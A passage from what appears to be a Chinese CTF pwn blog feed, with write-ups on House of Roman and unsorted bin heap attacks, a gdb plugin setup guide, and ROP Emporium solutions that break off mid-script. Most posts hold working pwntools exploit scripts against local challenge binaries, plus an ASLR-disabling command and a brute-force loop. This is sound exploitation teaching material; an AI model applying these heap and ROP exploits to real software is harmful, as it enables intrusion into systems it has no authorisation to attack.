<p>我们发现程序没有类似show()函数，但是write_chunk中有off by one 漏洞，在free_chunk函数中free没有置NULL，存在uaf漏洞，而且程序可以申请任意大小的chunk。这些条件符合House of Roman 利用条件。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>首先申请大于144的chunk A，然后free掉，这样chunk中就有<code>main_arean</code>的地址了</li>
<li>然后申请俩个0x70的chunk，C和D，然后都free掉，此时利用off by one 修改A的size位为0x70</li>
<li>利用uaf将原本D–&gt;C的bins链表修改为D—&gt;A</li>
<li>通过 修改低 2个字节，可以修改到 <code>malloc_hook - 0x23</code> 处 （ <code>malloc_hook - 0x23 + 0x8</code> 处的值为 <code>p64(0x7f)</code> )</li>
<li>连续malloc三次，申请到<code>malloc_hook - 0x23</code>这个chunk，这里要记得修复fastbin，因为链表中fd会指<code>malloc_hook - 0x23</code>这个chunk的fd，所以我们malloc三次后，要再free进这个bins链中一个chunk，然后将其fd置0,。</li>
<li>利用unsorted_bin_attack使<code>malloc_hook</code>地址的值为 <code>main_arena+88</code> 这里可以看我博客中关于unsorted_bin_attack的利用</li>
<li>修改<code>malloc_hook</code>地址的值的低3个字节，将其修改为one_gadget地址。</li>
<li>俩次free函数触发malloc_printerr<code>，</code>getshell</li>
</ol>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;new_chall&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;new_chall&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">def add(size,index) :</span><br><span class="line">	sh.recvuntil(&#39;Free\n&#39;)</span><br><span class="line">	sh.sendline(str(1))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def write(index,content) :</span><br><span class="line">	sh.recvuntil(&#39;Free\n&#39;)</span><br><span class="line">        sh.sendline(str(2))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(content)</span><br><span class="line">def free(index) :</span><br><span class="line">	sh.recvuntil(&#39;Free\n&#39;)</span><br><span class="line">        sh.sendline(str(3))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;aaaa&#39;)</span><br><span class="line">add(0x18,0) #A</span><br><span class="line">add(0xc8,1) #B</span><br><span class="line">add(0x65,2) #C</span><br><span class="line"></span><br><span class="line">#fake chunk</span><br><span class="line">fake&#x3D;&#39;a&#39;*0x68+p64(0x61)</span><br><span class="line">write(1,fake)#B</span><br><span class="line"></span><br><span class="line">#main_arean</span><br><span class="line">free(1) #B</span><br><span class="line">add(0xc8,1)#B</span><br><span class="line"></span><br><span class="line">add(0x65,3) #D</span><br><span class="line">add(0x65,15)#E 0x5555557571d0</span><br><span class="line">add(0x65,18) #F</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#off by one</span><br><span class="line">over&#x3D;&#39;a&#39;*0x18+&#39;\x71&#39;</span><br><span class="line">write(0,over)</span><br><span class="line"></span><br><span class="line">#D--&gt;B</span><br><span class="line">free(2) #C</span><br><span class="line">free(3) #D</span><br><span class="line">heap_po&#x3D;&#39;\x20&#39;</span><br><span class="line">write(3,heap_po)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#malloc_hook_nearly</span><br><span class="line">malloc_hook_nearly &#x3D; &quot;\xed\x1a&quot;</span><br><span class="line">write(1,malloc_hook_nearly)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">add(0x65,0) </span><br><span class="line">add(0x65,0)  </span><br><span class="line">add(0x65,0) #A</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">free(15)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">write(15,p64(0x00))</span><br><span class="line"></span><br><span class="line">add(0xc8,1)</span><br><span class="line">add(0xc8,2)</span><br><span class="line">free(1)</span><br><span class="line">payload&#x3D;&#39;b&#39;*0x8+&#39;\x00\x1b&#39;</span><br><span class="line">write(1,payload)</span><br><span class="line">add(0xc8,1)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">over &#x3D; &quot;R&quot;*0x13   # padding for malloc_hook</span><br><span class="line">over +&#x3D; &quot;\xa4\xd2\xaf&quot;</span><br><span class="line">write(0,over)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">free(18)</span><br><span class="line">free(18)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>调试的时候记得关掉aslr</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure>

<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>因为需要爆破，所以写个脚本，碰运气</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 5000&#96;; do python final.py; done;</span><br></pre></td></tr></table></figure>



<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://xz.aliyun.com/t/2316#toc-5" target="_blank" rel="noopener external nofollow noreferrer">https://xz.aliyun.com/t/2316#toc-5</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_roman-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_roman-zh/</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>House of Roman</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb插件组合使用</title>
    <url>/2020/05/13/gdb%E6%8F%92%E4%BB%B6%E7%BB%84%E5%90%88%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/h9JFzGoalIdEsAm.png" alt="alt"></p>
<a id="more"></a>

<h3 id="关于gdb插件peda-pwngdb-pwndbg的组合使用"><a href="#关于gdb插件peda-pwngdb-pwndbg的组合使用" class="headerlink" title="关于gdb插件peda,pwngdb,pwndbg的组合使用"></a>关于gdb插件peda,pwngdb,pwndbg的组合使用</h3><p>感谢NoOne师傅的指导，膜拜师傅</p>
<h4 id="安装peda插件"><a href="#安装peda插件" class="headerlink" title="安装peda插件"></a>安装peda插件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;peda</span><br><span class="line">echo &quot;source ~&#x2F;peda&#x2F;peda.py&quot;&gt;&gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>

<h4 id="安装pwndbg插件"><a href="#安装pwndbg插件" class="headerlink" title="安装pwndbg插件"></a>安装pwndbg插件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>

<h4 id="安装pwngdb插件"><a href="#安装pwngdb插件" class="headerlink" title="安装pwngdb插件"></a>安装pwngdb插件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;scwuaptx&#x2F;Pwngdb.git </span><br><span class="line">cp ~&#x2F;Pwngdb&#x2F;.gdbinit ~&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>我这里的pwndbg，peda，Pwngdb都在同一级目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;pwndbg&#x2F;pwndbg&#x2F;</span><br><span class="line">cp ~&#x2F;Pwngdb&#x2F;pwndbg&#x2F;pwngdb.py .</span><br><span class="line">cd ~&#x2F;pwndbg&#x2F;pwndbg&#x2F;commands&#x2F;</span><br><span class="line">cp ~&#x2F;Pwngdb&#x2F;pwndbg&#x2F;commands&#x2F;pwngdb.py .</span><br></pre></td></tr></table></figure>

<p>再将.gdbinit文件配置成如下就好了, .gdbinit文件打开方式: vim ~/.gdbinit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~&#x2F;pwndbg&#x2F;gdbinit.py</span><br><span class="line">source ~&#x2F;peda&#x2F;peda.py</span><br><span class="line">source ~&#x2F;Pwngdb&#x2F;angelheap&#x2F;gdbinit.py</span><br><span class="line">source ~&#x2F;Pwngdb&#x2F;pwngdb.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
        <category>gdb</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>Unsorted_Bin_Attack</title>
    <url>/2020/05/10/Unsorted_Bin_Attack/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/ZzDBFty64fueOsq.png" alt="alt"></p>
<a id="more"></a>

<h3 id="基本使用情况（CTF-WIKI）"><a href="#基本使用情况（CTF-WIKI）" class="headerlink" title="基本使用情况（CTF WIKI）"></a>基本使用情况（CTF WIKI）</h3><ol>
<li><p>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</p>
</li>
<li><p>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</p>
</li>
</ol>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* remove from unsorted list *&#x2F;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</span><br><span class="line">  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">unsorted_chunks (av)-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>可以看出当一个unsorted_chunk被取出来的时候，是依靠bk指针来进行chunk的取出的。如果我们控制了bk指针就可以将unsorted_chunks (av)写入到任何地方。</p>
<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">victim &#x3D; unsorted_chunks(av)-&gt;bk&#x3D;p   </span><br><span class="line">bck &#x3D; victim-&gt;bk&#x3D;p-&gt;bk &#x3D; target addr-16</span><br><span class="line">unsorted_chunks(av)-&gt;bk &#x3D; bck&#x3D;target addr-16</span><br><span class="line">bck-&gt;fd &#x3D; *(target addr -16+16) &#x3D; unsorted_chunks(av);</span><br></pre></td></tr></table></figure>

<p>其中victim和p都代表最后一个chunk，unsorted_chunks(av)代表unsorted_bins链，bck代表倒数第二个chunk，target addr-16代表伪造地址。</p>
<p>可以看到最后target addr的数据被修改为unsorted_chunks(av)的地址。</p>
<p>这里我们做一道例题。</p>
<h3 id="HITCON-Training-lab14-magic-heap-例题在CTF-WIKI"><a href="#HITCON-Training-lab14-magic-heap-例题在CTF-WIKI" class="headerlink" title="HITCON Training lab14 magic heap(例题在CTF WIKI)"></a>HITCON Training lab14 magic heap(例题在CTF WIKI)</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *v3; &#x2F;&#x2F; rsi@1</span><br><span class="line">  char *v4; &#x2F;&#x2F; rdi@1</span><br><span class="line">  int v5; &#x2F;&#x2F; eax@2</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+0h] [bp-10h]@2</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  v3 &#x3D; 0LL;</span><br><span class="line">  v4 &#x3D; (char *)stdin;</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(v4, v3);</span><br><span class="line">      v3 &#x3D; &amp;buf;</span><br><span class="line">      read(0, &amp;buf, 8uLL);</span><br><span class="line">      v4 &#x3D; &amp;buf;</span><br><span class="line">      v5 &#x3D; atoi(&amp;buf);</span><br><span class="line">      if ( v5 !&#x3D; 3 )</span><br><span class="line">        break;</span><br><span class="line">      delete_heap(&amp;buf, &amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v5 &gt; 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v5 &#x3D;&#x3D; 4 )</span><br><span class="line">        exit(0);</span><br><span class="line">      if ( v5 &#x3D;&#x3D; 4869 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( (unsigned __int64)magic &lt;&#x3D; 0x1305 )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 &#x3D; &quot;So sad !&quot;;</span><br><span class="line">          puts(&quot;So sad !&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v4 &#x3D; &quot;Congrt !&quot;;</span><br><span class="line">          puts(&quot;Congrt !&quot;);</span><br><span class="line">          l33t(&quot;Congrt !&quot;, &amp;buf);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        v4 &#x3D; &quot;Invalid Choice&quot;;</span><br><span class="line">        puts(&quot;Invalid Choice&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v5 &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap(&amp;buf, &amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v5 !&#x3D; 2 )</span><br><span class="line">        goto LABEL_17;</span><br><span class="line">      edit_heap(&amp;buf, &amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="create-heap函数如下："><a href="#create-heap函数如下：" class="headerlink" title="create_heap函数如下："></a>create_heap函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 create_heap()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@1</span><br><span class="line">  size_t size; &#x2F;&#x2F; [sp+8h] [bp-18h]@3</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@3</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Size of Heap : &quot;);</span><br><span class="line">      read(0, &amp;buf, 8uLL);</span><br><span class="line">      size &#x3D; atoi(&amp;buf);</span><br><span class="line">      *(&amp;heaparray + i) &#x3D; malloc(size);</span><br><span class="line">      if ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Allocate Error&quot;);</span><br><span class="line">        exit(2);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Content of heap:&quot;, &amp;buf);</span><br><span class="line">      read_input(*(&amp;heaparray + i), size);</span><br><span class="line">      puts(&quot;SuccessFul&quot;);</span><br><span class="line">      return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit-heap函数如下"><a href="#edit-heap函数如下" class="headerlink" title="edit_heap函数如下"></a>edit_heap函数如下</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 edit_heap()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; ST08_8@6</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4uLL);</span><br><span class="line">  v2 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v2 &lt; 0 || v2 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;heaparray + v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Size of Heap : &quot;, &amp;buf);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v0 &#x3D; atoi(&amp;buf);</span><br><span class="line">    printf(&quot;Content of heap : &quot;, &amp;buf);</span><br><span class="line">    read_input(*(&amp;heaparray + v2), v0);</span><br><span class="line">    puts(&quot;Done !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such heap !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete-heap函数如下："><a href="#delete-heap函数如下：" class="headerlink" title="delete_heap函数如下："></a>delete_heap函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 delete_heap()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-14h]@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@1</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4uLL);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) &#x3D; 0LL;</span><br><span class="line">    puts(&quot;Done !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such heap !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="133t函数如下："><a href="#133t函数如下：" class="headerlink" title="133t函数如下："></a>133t函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int l33t()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat .&#x2F;flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现，当我们控制 v3 为 4869，同时控制 magic 大于 4869，就可以得到 flag 了。而在edit_heap（）函数中，程序根据我们输入的size进行存入数据，没有进行判断是否合法，这就造成了任意长度的堆溢出漏洞。</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>很明显这是个unsorted_bin_attack，首先我们创建一个大于144字节chunk，然后free掉，再通过修改和它相邻的chunk，进而修改该chunk的bk地址。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; process(&#39;.&#x2F;magicheap&#39;)</span><br><span class="line"></span><br><span class="line">def create_heap(size, content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit_heap(idx, size, content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_heap(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create_heap(0x20, &quot;dada&quot;)  # 0</span><br><span class="line">create_heap(0x80, &quot;dada&quot;)  # 1</span><br><span class="line"># in order not to merge into top chunk</span><br><span class="line">create_heap(0x20, &quot;dada&quot;)  # 2</span><br><span class="line"></span><br><span class="line">del_heap(1)</span><br><span class="line"></span><br><span class="line">magic &#x3D; 0x6020c0</span><br><span class="line">fd &#x3D; 0</span><br><span class="line">bk &#x3D; magic - 0x10</span><br><span class="line"></span><br><span class="line">edit_heap(0, 0x20 + 0x20, &quot;a&quot; * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))</span><br><span class="line">create_heap(0x80, &quot;dada&quot;)  #trigger unsorted bin attack</span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line">r.sendline(&quot;4869&quot;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>Unsorted_Bin</tag>
      </tags>
  </entry>
  <entry>
    <title>Rop_Emporium</title>
    <url>/2020/05/07/Rop-Emporium/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/7e9A8cqzJPOuQ3K.jpg" alt="alt"></p>
<a id="more"></a>

<p>最近在学习ROP，发现ROP Emporium这个网站上题目挺好，就一直在做，我这里用到查gadget的工具是ROPgadget，其他工具也是可以的。</p>
<h3 id="ret2win-32"><a href="#ret2win-32" class="headerlink" title="ret2win_32"></a>ret2win_32</h3><p>简单的覆盖返回地址跳转到后门函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;ret2win32&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4+&quot;\x59\x86\x04\x08&quot;</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ret2win-64"><a href="#ret2win-64" class="headerlink" title="ret2win_64"></a>ret2win_64</h3><p>和32位一样，覆盖返回地址跳转到后门函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;ret2win&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*8+p64(0x0400811)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="split-32"><a href="#split-32" class="headerlink" title="split_32"></a>split_32</h3><p>程序的system中不是/bin/sh，通过查找字符串发现在数据段，将参数数据段参数传递给system就ok了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;split32&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4+p32(0x08048657)+p32(0x0804a030)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="split-64"><a href="#split-64" class="headerlink" title="split_64"></a>split_64</h3><p>64位和32位有点不一样，在传参方面64位前几个参数是放在rdi，rsi，rdx，rcx，r8,r9中，所以需要将参数放到rdi中才可以调用成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;split&quot;)</span><br><span class="line">system_addr&#x3D;0x0400810</span><br><span class="line">rdi_addr&#x3D;0x0400883</span><br><span class="line">flag_addr&#x3D;0x0601060</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;a&#39;*0x8+p64(rdi_addr)+p64(flag_addr)+p64(system_addr)</span><br><span class="line">#当程序ret时，进入rdi_addr，然后rdi再ret到system_addr每一次esp指向都不一样</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="callme-32"><a href="#callme-32" class="headerlink" title="callme_32"></a>callme_32</h3><p>程序中没有system和/bin/sh,给了一个.so文件，用IDA查看发现程序通过callme_one函数将flag文件导入,通过callme_two和callme_three函数将flag解密输出,这三个函数还需要在0x1,0x2,0x3这三个参数，由于.so文件相当于在调用动态链接库，没有办法esp自减，所以我们利用程序中的gadget来平衡一下栈 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;callme32&quot;)</span><br><span class="line">callme_one_addr&#x3D;0x080485c0</span><br><span class="line">callme_two_addr&#x3D;0x08048620</span><br><span class="line">callme_three_addr&#x3D;0x080485b0</span><br><span class="line">gadget_addr&#x3D;0x080488a9</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4</span><br><span class="line">payload+&#x3D;p32(callme_one_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">payload+&#x3D;p32(callme_two_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">payload+&#x3D;p32(callme_three_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span 